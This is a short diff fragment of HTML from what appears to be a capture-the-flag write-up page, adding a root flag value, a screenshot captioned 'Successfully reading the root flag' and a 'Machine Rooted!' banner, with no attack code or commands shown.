+  <code class="flag-value">5e413a4c1dc293afc6cb7644b18dd2e8</code>
+</div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20251119224917.png" alt="Successfully reading the root flag" loading="lazy" /><span class="img-caption">Successfully reading the root flag</span></div>
+      <div class="rooted-box">✅ Machine Rooted!</div>
     </div>
   </div>
 
